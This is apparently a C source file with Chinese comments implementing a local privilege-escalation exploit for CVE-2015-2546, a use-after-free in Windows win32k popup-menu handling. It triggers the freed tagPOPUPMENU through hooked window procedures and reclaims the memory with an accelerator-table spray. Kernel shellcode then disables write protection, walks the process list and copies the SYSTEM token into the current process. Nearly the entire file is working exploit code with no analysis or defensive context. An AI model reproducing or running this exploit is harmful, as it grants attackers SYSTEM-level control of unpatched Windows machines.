#include "CVE-2015-2546.h"

#define ACCEL_ENTRIES	0x5				// 一次要创建多少个加速表对象
#define ACCELERATOR_NUMBER 0x1000		// 创建加速表的次数

BOOL bFlag = FALSE;
DWORD g_dwFlag = 0;
WNDPROC g_lpPrevWndFunc = NULL;
HWND g_hWnd = NULL;

BOOL Exploit_CVE_2015_2546()
{
	BOOL bRet = TRUE;

	
	if (!Init_2015_2546())
	{
		printf("Init 失败...\n");
		bRet = FALSE;
		goto exit;
	}
	

	HWND hWnd = NULL;
	WNDCLASS wc = { 0 };
	HMENU hMenu1 = NULL, hMenu2 = NULL;
	MENUITEMINFO Item1 = { 0 }, Item2 = { 0 };

	memset(&wc, 0, sizeof(wc));

	wc.hInstance = GetModuleHandle(NULL);
	wc.lpfnWndProc = WndProc_2015_2546;
	wc.lpszClassName = "1900";

	if (!RegisterClassA(&wc))
	{
		ShowError("RegisterClassA", GetLastError());
		bRet = FALSE;
		goto exit;
	}

	hWnd = CreateWindowA(wc.lpszClassName,
						 "",
						 WS_OVERLAPPEDWINDOW | WS_VISIBLE,
						 0,
						 0,
						 640,
						 480,
						 NULL,
						 NULL,
						 wc.hInstance,
						 NULL);
	if (!hWnd)
	{
		ShowError("CreateWindowA", GetLastError());
		bRet = FALSE;
		goto exit;
	}

	hMenu1 = CreatePopupMenu();
	if (!hMenu1)
	{
		ShowError("CreatePopupMenu", GetLastError());
		bRet = FALSE;
		goto exit;
	}

	memset(&Item1, 0, sizeof(Item1));
	memset(&Item2, 0, sizeof(Item2));

	Item1.cbSize = sizeof(Item1);
	Item1.fMask = MIIM_STRING;
	if (!InsertMenuItemA(hMenu1, 0, TRUE, &Item1))
	{
		ShowError("InsertMenuItemA 1", GetLastError());
		bRet = FALSE;
		goto exit;
	}

	hMenu2 = CreatePopupMenu();
	if (!hMenu2)
	{
		ShowError("CreatePopupMenu 2", GetLastError());
		bRet = FALSE;
		goto exit;
	}

	Item2.fMask = MIIM_STRING | MIIM_SUBMENU;
	Item2.dwTypeData = "";
	Item2.cch = 1;
	Item2.hSubMenu = hMenu1;
	Item2.cbSize = sizeof(Item2);

	if (!InsertMenuItemA(hMenu2, 0, TRUE, &Item2))
	{
		ShowError("InsertMenuItemA 2", GetLastError());
		bRet = FALSE;
		goto exit;
	}

	HHOOK winHook = SetWindowsHookExA(WH_CALLWNDPROC,
									  WndProcHook_2015_2546,
									  NULL,
									  GetCurrentThreadId());
	if (winHook == NULL)
	{
		ShowError("SetWindowsHookExA", GetLastError());
		bRet = FALSE;
		goto exit;
	}

	Sleep(1000);

	// 触发漏洞
	if (!TrackPopupMenu(hMenu2, 0, 0, 0, 0, hWnd, NULL))
	{
		ShowError("TrackPopupMenu", GetLastError());
		bRet = FALSE;
		goto exit;
	}

exit:
	if (!UnhookWindowsHook(WH_CALLWNDPROC, WndProcHook_2015_2546))
	{
		ShowError("UnhookWindowsHook", GetLastError());
		bRet = FALSE;
		goto exit;
	}
	if (hMenu2)
	{
		DestroyMenu(hMenu2);
		hMenu2 = NULL;
	}

	if (hMenu1)
	{
		DestroyMenu(hMenu1);
		hMenu1 = NULL;
	}

	if (hWnd)
	{
		DestroyWindow(hWnd);
		hWnd = NULL;
	}

	return bRet;
}

LRESULT CALLBACK MenuWndProc_2015_2546(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	LPACCEL	lpAccel = NULL;

	if (uMsg == 0x1EB)
	{
		return (LONG)g_hWnd;
	}
	else if (uMsg == 0x1F0)
	{
		if (g_hWnd != NULL)
		{
			// 销毁#32768窗口,tagPOPUPMENU的空间将被释放
			if (!DestroyWindow(g_hWnd))
			{
				ShowError("DestroyWindow", GetLastError());
			}

			// 使用加速表对象占用释放的tagPOPUPMENU的空间
			for (DWORD i = 0; i < ACCELERATOR_NUMBER; i++)
			{
				lpAccel = (LPACCEL)malloc(sizeof(ACCEL) * ACCEL_ENTRIES);
				if (lpAccel) CreateAcceleratorTable(lpAccel, ACCEL_ENTRIES);
			}
		}
		
		return 0;
	}
	else if (uMsg == 0x1E5)
	{
		return 0x10;
	}

	return CallWindowProcA(g_lpPrevWndFunc, hWnd, uMsg, wParam, lParam);
}

LRESULT CALLBACK WndProcHook_2015_2546(int nCode, WPARAM wParam, LPARAM lParam)
{
	CWPSTRUCT *pWndProcArgs = (CWPSTRUCT *)lParam;

	if (pWndProcArgs->message == 0x1EB || 
		pWndProcArgs->message == 0x1F0 ||
		pWndProcArgs->message == 0x1E5)
	{
		if (g_dwFlag < 3)
		{
			g_dwFlag++;

			g_lpPrevWndFunc = (WNDPROC)SetWindowLongA(pWndProcArgs->hwnd,
													  GWL_WNDPROC,
													  (LONG)MenuWndProc_2015_2546);
			if (g_lpPrevWndFunc == 0)
			{
				ShowError("SetWindowLongA", GetLastError());
			}
		}
	}

	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

LRESULT CALLBACK WndProc_2015_2546(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	if (uMsg == WM_ENTERIDLE)
	{
		if (!bFlag)
		{
			bFlag = TRUE;
			PostMessageA(hWnd, WM_KEYDOWN, VK_DOWN, 0);
			PostMessageA(hWnd, WM_KEYDOWN, VK_RIGHT, 0);
			PostMessageA(hWnd, WM_MOUSEMOVE, 0, 1);
		}
		else
		{
			PostMessageA(hWnd, WM_CLOSE, 0, 0);
		}
	}

	return DefWindowProcA(hWnd, uMsg, wParam, lParam);
}

LRESULT CALLBACK DefaultMenuProc_2015_2546(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	return DefWindowProcA(hWnd, uMsg, wParam, lParam);
}


BOOL Init_2015_2546()
{
	BOOL bRet = TRUE;
	LPACCEL lpAccel = NULL;
	DWORD  i = 0;

	// 创建窗口对象
	g_hWnd = CreateWindowExA(0,
							 "#32768",
						     NULL,
							 0,
							 -1, -1,
							 0, 0,
							 NULL,
							 NULL,
							 NULL,
							 NULL);

	if (!g_hWnd)
	{
		ShowError("CreateWindowExA #32768", GetLastError());
		bRet = FALSE;
		goto exit;
	}

	if (!SetWindowLongA(g_hWnd, GWL_WNDPROC, (ULONG)DefaultMenuProc_2015_2546))
	{
		ShowError("SetWindowLongA", GetLastError());
		bRet = FALSE;
		goto exit;
	}

	// 在0地址申请内存成功
	if (!AllocateZeroMemory())
	{
		bRet = FALSE;
		goto exit;
	}

	*(DWORD*)(0xD) = GetPtiCurrent_2015_2546();
	*(BYTE*)(0x1B) = (BYTE)4;
	*(DWORD*)(0x65) = (DWORD)ShellCode_2015_2546;	

exit:
	return bRet;
}

DWORD GetPtiCurrent_2015_2546()
{
	__asm
	{
		mov eax, fs:[0x18]		// get teb
		mov eax, [eax + 0x40]	// get win32Thread
	}
}

LRESULT CALLBACK ShellCode_2015_2546(DWORD p1, DWORD p2, DWORD p3, DWORD p4)
{
	// 关闭页保护
	__asm
	{
		cli
		mov eax, cr0
		and eax, ~0x10000
		mov cr0, eax
	}

	__asm
	{
		// 取当前线程
		mov eax, fs:[0x124]
		// 取线程对应的EPROCESS
		mov esi, [eax + 0x150]
		mov eax, esi
	searchWin7 :
		mov eax, [eax + 0xB8]
		sub eax, 0xB8
		mov edx, [eax + 0xB4]
		cmp edx, 0x4
		jne searchWin7
		mov eax, [eax + 0xF8]
		mov[esi + 0xF8], eax
	}

	// 开起页保护
	__asm
	{
		mov eax, cr0
		or eax, 0x10000
		mov cr0, eax
		sti
	}

	return 0;
}